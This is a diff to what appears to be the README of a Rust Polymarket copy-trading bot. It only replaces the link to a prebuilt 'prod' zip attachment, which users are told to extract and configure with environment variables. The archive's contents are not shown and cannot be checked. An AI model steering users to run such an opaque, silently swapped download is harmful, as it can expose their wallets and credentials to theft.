@@ -20,7 +20,7 @@ A high-performance Rust-based automated trading bot that copies trades from succ
 ## 🚀 Let's Trade!!
 
 ### **Polymarket Copy Trading Bot - Rust (Prod Version)**
-- 🗂️ [polymarket-copy-trading-bot-prod.zip](https://github.com/user-attachments/files/25067356/polymarket-copy-trading-bot-prod.zip)
+- 🗂️ [polymarket-copy-trading-bot-prod.zip](https://github.com/user-attachments/files/25094873/polymarket-copy-trading-bot-prod.zip)
 
 1. Extract `polymarket-copy-trading-bot-prod.zip` file.
 2. Environment Variables Settings
